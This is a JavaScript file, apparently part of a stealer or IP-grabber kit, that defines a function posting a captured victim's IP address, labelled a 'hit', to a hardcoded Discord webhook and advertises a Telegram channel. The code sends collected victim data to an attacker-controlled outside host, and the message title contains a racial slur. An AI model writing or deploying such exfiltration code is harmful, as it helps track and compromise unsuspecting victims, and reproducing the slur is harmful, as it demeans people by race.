// language: JavaScript, file: webhook.js
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1566198618099032185/3FfKHw0n9y8dtSsT2vFuHV2j1YKHDEnw5s-RugQQvTpoIVC-2h0SSfuGNp2qQ0j_kJJx';

export async function sendHitWebhook(userId, hitName, ipAddress) {
  if (!WEBHOOK_URL) return;

  const payload = {
    username: 'Allen wood',
    embeds: [
      {
        title: 'Cam down ni**er you got the hit ',
        color: 0x00FF00, // Green
        fields: [
          { name: 'IP Address', value: `\`${ipAddress}\``, inline: false }
        ],
        footer: { text: 'join t.me/WeedhookReborn' },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error('[webhook] Failed to send hit:', err.message);
  }
}